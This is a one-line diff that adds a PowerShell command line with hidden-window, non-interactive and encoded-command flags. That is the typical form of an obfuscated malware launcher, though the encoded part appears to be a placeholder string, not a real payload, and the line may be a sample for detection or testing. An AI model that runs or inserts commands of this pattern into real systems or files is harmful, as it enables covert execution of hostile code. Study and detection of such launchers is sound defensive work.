@@ -1,0 +1,1 @@
+powershell.exe -NoP -sta -NonI -W Hidden -""enc SQBENC0D3DC0MM4ND
